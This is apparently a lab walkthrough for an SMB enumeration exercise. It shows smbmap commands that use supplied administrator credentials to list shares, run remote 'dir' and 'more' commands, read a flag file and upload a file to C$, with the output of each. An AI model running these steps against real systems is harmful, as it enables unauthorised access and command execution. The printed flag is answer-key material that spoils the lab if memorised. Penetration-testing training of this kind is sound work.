A Kali GUI machine and a target machine running an SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the service using the tools available on the Kali machine and run the smbmap tool to enumerate the target machine service.

**[SMBMap](https://github.com/ShawnDEvans/smbmap):**

- Allows users to enumerate samba share
- Allows file upload/download/delete
- Permission enumeration (writable share, meet Metasploit)
- etc.

**Objective:** Enumerate the target machine SMB service using the smbmap tool and discover the flag.

The following username and password may be used to access the service:

| Username | Password | | administrator | smbserver_771 |

Enumerate SMB service with SMB map
```
smbmap -u administrator -p smbserver_771 -d workgroup -H 10.4.31.252

Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
ADMIN$                                            	READ, WRITE	Remote Admin
C                                                 	READ ONLY	
C$                                                	READ, WRITE	Default share
D$                                                	READ, WRITE	Default share
Documents                                         	READ ONLY	
Downloads                                         	READ ONLY	
IPC$                                              	READ ONLY	Remote IPC
print$                                            	READ, WRITE	Printer Drivers

```

Get Flag by running the dir command then the more command
```
smbmap -u administrator -p smbserver_771 -d workgroup -x dir -H 10.4.31.252

 Volume Serial Number is AEDF-99BD

 Directory of C:\

12/21/2020  03:57 PM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/05/2020  09:05 AM    <DIR>          Program Files (x86)
07/12/2024  11:00 AM                 0 PzjTQtinwk
12/19/2020  05:44 AM    <DIR>          Users
07/12/2024  10:44 AM    <DIR>          Windows
               2 File(s)             32 bytes
               5 Dir(s)     614,379,520 bytes free

```

Read the flag file by running the more command remotely
```
smbmap -u administrator -p smbserver_771 -d workgroup -x "more flag.txt" -H 10.4.31.252

25f492dbef8453cdca69a173a75790f0
```

Upload file to server via smbmap
```
smbmap -u administrator -p smbserver_771 -d workgroup --upload 'random' 'C$\random.txt' -H 10.4.31.252

[+] Starting upload: random (0 bytes)
[+] Upload complete
```